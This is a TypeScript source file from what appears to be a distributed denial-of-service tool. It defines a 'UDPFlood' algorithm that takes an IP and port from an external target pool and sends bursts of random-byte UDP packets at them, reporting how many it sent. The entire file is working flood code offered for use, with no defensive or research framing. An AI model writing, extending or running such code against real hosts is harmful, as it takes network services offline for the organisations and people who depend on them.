import { createSocket } from 'dgram'
import { randomBytes } from 'crypto'

import { UDPFloodTarget } from '../external/targetsPool'
import { Algorithm, ExecutionResult } from './algorithm'

export class UDPFlood extends Algorithm {
  isValid (target: UDPFloodTarget): boolean {
    if (typeof target.ip !== 'string' || typeof target.port !== 'number') {
      return false
    }
    return true
  }

  async execute (target: UDPFloodTarget): Promise<ExecutionResult> {
    const client = createSocket({ type: 'udp4' })
    let packetsSend = 0
    let repeats = 16 + Math.floor(Math.random() * 32)

    while (repeats > 0) {
      repeats -= 1

      try {
        const request = new Promise<number>((resolve, reject) => {
          const rand = randomBytes(16 + Math.floor(Math.random() * 16))
          client.send(rand, target.port, target.ip, (error, bytes) => {
            if (error === null) {
              resolve(bytes)
            } else {
              reject(error)
            }
          })
        })

        await request
        packetsSend += 1
      } catch (e) {
        console.error(e)
        break
      }
    }

    try {
      client.close()
    } catch (e) {
      console.error(e)
    }

    return { packetsSend, packetsSuccess: packetsSend, target }
  }
}
